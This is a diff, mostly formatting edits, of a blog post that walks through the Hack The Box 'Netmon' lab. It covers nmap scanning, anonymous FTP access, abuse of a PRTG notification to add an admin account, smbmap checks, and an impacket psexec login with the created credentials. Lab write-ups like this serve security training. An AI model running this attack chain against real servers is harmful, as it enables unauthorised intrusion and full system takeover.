@@ -1,7 +1,7 @@
 ---
 layout: post
 title: Hack The Box - Netmon
-date: '2023-02-14 22:21:19 +0100'
+date: "2023-02-14 22:21:19 +0100"
 image:
   path: /assets/img/posts/netmon/netmon-card.png
   alt: Netmon card
@@ -9,28 +9,24 @@ categories: [HackTheBox, Beginner Track]
 tags: [Hack-The-Box-Easy, rsa]
 ---
 
-
 ```
 HOST : 10.10.10.152
 ```
 
-
 ## Tools used
 
-  - [nmap](https://nmap.org/)
-  - [smbmap](https://github.com/ShawnDEvans/smbmap)
-
+- [nmap](https://nmap.org/)
+- [smbmap](https://github.com/ShawnDEvans/smbmap)
 
 ## What to do ?
 
-  - First we'll scan port with `nmap` to discover if was some it open
-  - Then we'll find a loophole and exploit it.
-
+- First we'll scan port with `nmap` to discover if was some it open
+- Then we'll find a loophole and exploit it.
 
 ## Nmap scan
 
 ```bash
-0bytes> nmap -A -Pn {target-ip}
+rether> nmap -A -Pn {target-ip}
 [...]
 PORT    STATE SERVICE      VERSION
 21/tcp  open  ftp          Microsoft ftpd
@@ -42,7 +38,7 @@ PORT    STATE SERVICE      VERSION
 | 02-02-19  11:28PM       <DIR>          Program Files (x86)
 | 02-03-19  07:08AM       <DIR>          Users
 |_02-25-19  10:49PM       <DIR>          Windows
-| ftp-syst: 
+| ftp-syst:
 |_  SYST: Windows_NT
 80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
 |_http-trane-info: Problem with XML parsing of /evox/about
@@ -57,9 +53,10 @@ Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft
 ```
 
 > Command explained :
- - `-A` : Enable OS detection, version detection, script scanning, and traceroute
- - `-Pn` : No ping scan
-{: .prompt-info }
+
+- `-A` : Enable OS detection, version detection, script scanning, and traceroute
+- `-Pn` : No ping scan
+  {: .prompt-info }
 
 We see that port 21 is open and allows anonymous ftp connections.
 
@@ -69,12 +66,12 @@ The anonymous connection is simply a default connection with the username 'anony
 So let's try :
 
 ```bash
-0bytes> ftp 10.10.10.152        
+rether> ftp 10.10.10.152
 Connected to 10.10.10.152.
 220 Microsoft FTP Service
 Name (10.10.10.152:rether): anonymous
 331 Anonymous access allowed, send identity (e-mail name) as password.
-Password: 
+Password:
 230 User logged in.
 Remote system type is Windows_NT.
 ftp>
@@ -103,7 +100,7 @@ local: user.txt remote: user.txt
 ```
 
 ```bash
-0bytes> cat user.txt
+rether> cat user.txt
 [user-flag]
 ```
 
@@ -160,7 +157,6 @@ Go to `Setup/Account Setting/Notifications` :
 
 ![PRTG notification panel](/assets/img/posts/netmon/netmon-screenshot-prtg-notification-panel.png "PRTG notification panel")
 
-
 To create a new notification, click on the plus button in the right corner.
 
 Scrolldown and enable `Execute Program`. Select `Demo exe notification - outfile.ps1` option, is allow to execute the script in powershell for more information : [PRTG DOC](https://www.paessler.com/manuals/prtg/custom_notifications)
@@ -176,8 +172,8 @@ These commands create a new user named `prtguser` with the password `PrTg@dmin20
 Now, to check if the user has been created, we can use `smbmap`.
 
 ```bash
-0bytes> smbmap -u prtguser -p PrTg@dmin2023 -H 10.10.10.152
-[+] IP: 10.10.10.152:445        Name: 10.10.10.152                                      
+rether> smbmap -u prtguser -p PrTg@dmin2023 -H 10.10.10.152
+[+] IP: 10.10.10.152:445        Name: 10.10.10.152
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         ADMIN$                                                  READ, WRITE     Remote Admin
@@ -190,7 +186,7 @@ We have full access to the server
 To get the root flag, we can use psexec from this [github repository](https://github.com/fortra/impacket/blob/master/examples/psexec.py).
 
 ```bash
-0bytes> ./psexec.py 'prtguser:PrTg@dmin2023@10.10.10.152'
+rether> ./psexec.py 'prtguser:PrTg@dmin2023@10.10.10.152'
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [*] Requesting shares on 10.10.10.152.....
